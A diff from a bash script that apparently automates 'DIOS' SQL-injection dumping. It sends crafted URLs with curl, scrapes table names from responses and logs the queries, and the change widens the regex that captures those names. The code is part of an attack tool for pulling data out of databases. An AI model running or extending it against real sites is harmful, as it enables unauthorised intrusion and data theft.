@@ -375,7 +375,7 @@ dios() {
           base99=$(echo "$st$bs57" | tr -d "\n")
           echo -e "DIOS : $base99"
         #echo -e "\n$bs57\n$base44\n$bs9\n$st" #test
-         if curl -s -L "$base99" | grep -a -o '<li>[^:]*::[[:alnum:]]*' | cut -d '>' -f2 > .table
+         if curl -s -L "$base99" | grep -a -o '<li>[^:]*::[_/-/./[:alnum:]]*' | cut -d '>' -f2 > .table
            then 
             dump
          else
@@ -386,7 +386,7 @@ dios() {
     #echo -e "DIOS : $in $i $_dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' #test
     echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
     echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
-    if curl -s -L "$ls" | grep -a -o '<li>[^:]*::[[:alnum:]]*' | cut -d '>' -f2 > .table
+    if curl -s -L "$ls" | grep -a -o '<li>[^:]*::[_/-/./[:alnum:]]*' | cut -d '>' -f2 > .table
         then 
           dump
         else
